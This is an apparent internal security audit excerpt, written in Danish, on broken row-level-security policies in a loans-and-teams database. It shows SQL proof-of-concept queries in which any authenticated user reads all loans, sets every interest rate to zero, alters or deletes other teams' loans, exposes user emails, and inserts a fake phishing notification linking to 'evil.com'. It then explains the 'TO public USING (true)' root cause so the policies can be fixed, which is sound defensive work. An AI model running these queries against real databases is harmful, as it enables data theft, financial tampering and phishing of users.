## Eksploit-verifikation (sample queries)

```sql
-- P0 loans — random auth user kan se ALLE 17 loans
SET LOCAL role = authenticated;
SET LOCAL request.jwt.claim.sub = '00000000-0000-0000-0000-000000000000';
SELECT COUNT(*) FROM loans;  -- → 17 (alle synlige)

-- P0 notifications phishing — kan oprette fake notification til offer
INSERT INTO notifications (id, user_id, type, title, message, created_at)
SELECT gen_random_uuid(), id, 'bid_received', 'Du har vundet $100k', 'Klik: evil.com', NOW()
FROM users LIMIT 1;
-- → success

-- P0 loan_config — kan sætte alle teams' renter til 0
UPDATE loan_config SET interest_rate_pct = 0;
-- → success

-- P0 loans tampering
INSERT INTO loans (..., team_id=<other-team>, principal=999999, ...);
UPDATE loans SET amount_remaining = amount_remaining - 100000 WHERE id=<other-team-loan>;
DELETE FROM loans WHERE id=<other-team-loan>;
-- → alle 3 succeeded

-- P1 users PII — eksponerer email+discord_id+consent_preferences til alle auth users
SELECT COUNT(*) FROM users WHERE email IS NOT NULL;          -- → 24
SELECT COUNT(*) FROM users WHERE discord_id IS NOT NULL;     -- → 14
```

## Root-cause-pattern

5 af de eksploiterbare policies har samme bug-pattern:

```sql
CREATE POLICY "Service role full access X" ON X
  FOR ALL TO public  -- ← skal være TO service_role!
  USING (true);
```

`TO public` betyder ALLE roller inkl. `authenticated`. Skulle have været `TO service_role`. Service-role bypasser RLS uanset, så `TO service_role` policies fungerer som "kun service kan skrive".

**Forward-guard:** advisor-rule `rls_policy_always_true` (#527 Phase B) — er allerede flagget, men priority var P2. **Dette audit beviser P0/P1.**
